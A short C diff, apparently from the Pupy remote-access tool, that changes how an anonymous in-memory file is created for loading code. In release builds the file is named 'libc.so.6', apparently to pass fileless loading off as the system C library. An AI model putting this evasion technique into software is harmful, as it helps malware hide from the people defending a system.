@@ -33,28 +33,45 @@
 #define PROCFS_PATH "/proc/"
 #define MEMFD_FILE_PATH PROCFS_PATH "%d/fd/"
 
+static bool memfd_checked = false;
+static bool memfd_works = true;
+
+inline static bool pupy_memfd_supported()
+{
+  int fd;
+
+  if (memfd_checked)
+    return memfd_works;
+
+  fd = syscall(__NR_memfd_create, "check", MFD_CLOEXEC | MFD_ALLOW_SEALING);
+  close(fd);
+
+  return fd != -1;
+}
+
 inline static int pupy_memfd_create(char *path, unsigned int path_size)
 {
 #ifdef Linux
 
-#ifndef DEBUG
-  memset(path, 0x0, path_size);
-  strncpy(path, "libc.so.6", path_size);
+#ifdef DEBUG
+    #define _path path
+#else
+    char _path[PATH_MAX] = "libc.so.6";
 #endif
 
     /* Do not make syscall billion times */
-    static bool memfd_works = true;
-
-    if (!memfd_works)
+    if (memfd_checked && !memfd_works) {
+      errno = ENOSYS;
       return -1;
+    }
 
-    int fd = syscall(__NR_memfd_create, path, MFD_CLOEXEC | MFD_ALLOW_SEALING);
+    int fd = syscall(__NR_memfd_create, _path, MFD_CLOEXEC | MFD_ALLOW_SEALING);
 
     if (fd == -1) {
-    if (errno == ENOSYS)
-      memfd_works = false;
+      if (errno == ENOSYS)
+        memfd_works = false;
 
-        return -1;
+      return -1;
     }
 
     snprintf(path, path_size, MEMFD_FILE_PATH "%d", getpid(), fd);
